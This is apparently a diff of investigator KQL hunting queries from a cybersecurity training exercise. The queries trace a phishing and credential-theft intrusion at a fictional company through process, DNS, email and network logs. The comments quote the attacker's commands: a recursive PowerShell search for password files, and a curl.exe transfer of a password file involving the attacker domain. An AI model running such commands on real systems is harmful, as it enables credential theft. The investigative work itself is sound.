@@ -1,12 +1,12 @@
 // Defacment MITRE - T1491 
 
-// Defacment MITRE - T1491 
-
 Employees
 | where role == 'Web Administrator'
 // Anita Bath
 // MYZB-LAPTOP
 // 10.10.0.8
+// u/n: anbath
+// e: anita_bath@framtidxdevcorp.com
 
 ProcessEvents
 | where hostname == 'MYZB-LAPTOP'
@@ -32,7 +32,99 @@ OutboundNetworkEvents
 
 ProcessEvents
 | where hostname == 'MYZB-LAPTOP'
-| where process_commandline has 'password'
+
 // Get-ChildItem -Path C:\Users\anbath\Documents\* -Include *password* -Recurse
+// mypasswordsnstuff.txt
+// curl.exe -o C:\ProgramData\Heartburn\mypasswordsnstuff.txt https://newdevelopmentupdates.org/mypasswordsnstuff.txt
+
+PassiveDns
+| where domain == 'newdevelopmentupdates.org'
+// 239.72.6.37
+
+PassiveDns
+| where domain == 'newdevelopmentupdates.org'
+| distinct ip
+| lookup PassiveDns on ip
+| distinct domain
+// other domains that ip resolve to - greenprojectnews.net
+
+let TA_ips =
+PassiveDns
+| where domain == 'newdevelopmentupdates.org'
+| distinct ip;
+AuthenticationEvents
+| where src_ip in (TA_ips)
+| where username == 'anbath'
+// using firefox 3.6.11
 
 
+let TA_domains =
+PassiveDns
+| where domain == 'newdevelopmentupdates.org'
+| distinct ip
+| lookup PassiveDns on ip
+| distinct domain;
+Email
+| where recipient == 'anita_bath@framtidxdevcorp.com'
+| where link has_any(TA_domains)
+
+OutboundNetworkEvents
+| where src_ip == '10.10.0.8'
+| where url == 'https://greenprojectnews.net/share/modules/files/share/enter'
+
+OutboundNetworkEvents
+| where src_ip == '10.10.0.8'
+| where url startswith 'https://greenprojectnews.net/share/modules/files/share/enter'
+| where url has 'username'
+
+
+// Section 2
+Employees
+| count
+
+Employees
+| where name == "Mona Hunter"
+// Johanna Karlsson - CEO
+// Mona's Email - mona_hunter@framtidxdevcorp.com - 10.10.0.131
+
+Email
+| where recipient == "mona_hunter@framtidxdevcorp.com"
+| count
+
+Email
+| where sender has "techinnovators.io"
+| distinct sender
+| count
+
+OutboundNetworkEvents
+| where src_ip == "10.10.0.131"
+| distinct url
+| count
+
+PassiveDns
+| where domain contains "green"
+| distinct domain
+| count
+
+let dorothy_ips = Employees
+| where name has "Dorothy"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (dorothy_ips)
+| distinct url
+| count
+
+let dorothy_un = Employees
+| where name has "Dorothy"
+| distinct username;
+AuthenticationEvents
+| where username in (dorothy_un)
+| count
+
+Employees
+| where role == "Chief Architect"
+// Other Arch - Sofia Lindgren - 10.10.0.18 - sofia_lindgren@framtidxdevcorp.com - VJVS-MACHINE - solindgren
+// Erik Bjorn - 10.10.0.3 - erik_bjorn@framtidxdevcorp.com - LRJP-DESKTOP - erbjorn
+
+Email
+| where sender has "techinnovators.io" and (recipient == "sofia_lindgren@framtidxdevcorp.com" or recipient == "erik_bjorn@framtidxdevcorp.com")
